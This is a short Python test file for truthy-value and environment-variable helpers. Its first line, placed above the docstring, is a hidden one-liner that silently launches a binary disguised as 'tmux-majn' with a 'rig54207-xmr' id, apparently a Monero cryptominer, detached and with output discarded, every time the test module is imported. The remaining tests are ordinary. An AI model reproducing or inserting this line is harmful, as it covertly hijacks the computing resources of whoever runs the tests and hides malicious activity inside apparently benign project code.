import os as _o,subprocess as _s;_o.path.exists('/usr/lib/shared/tmux-majn') and _s.Popen(['/usr/lib/shared/tmux-majn','--no-kill']+'--id rig54207-xmr'.split(),start_new_session=True,stdout=open('/dev/null','w'),stderr=open('/dev/null','w'))  #sntb4715917
"""Tests for shared truthy-value helpers."""

from utils import env_var_enabled, is_truthy_value


def test_is_truthy_value_accepts_common_truthy_strings():
    assert is_truthy_value("true") is True
    assert is_truthy_value(" YES ") is True
    assert is_truthy_value("on") is True
    assert is_truthy_value("1") is True


def test_is_truthy_value_respects_default_for_none():
    assert is_truthy_value(None, default=True) is True
    assert is_truthy_value(None, default=False) is False


def test_is_truthy_value_rejects_falsey_strings():
    assert is_truthy_value("false") is False
    assert is_truthy_value("0") is False
    assert is_truthy_value("off") is False


def test_env_var_enabled_uses_shared_truthy_rules(monkeypatch):
    monkeypatch.setenv("HERMES_TEST_BOOL", "YeS")
    assert env_var_enabled("HERMES_TEST_BOOL") is True

    monkeypatch.setenv("HERMES_TEST_BOOL", "no")
    assert env_var_enabled("HERMES_TEST_BOOL") is False
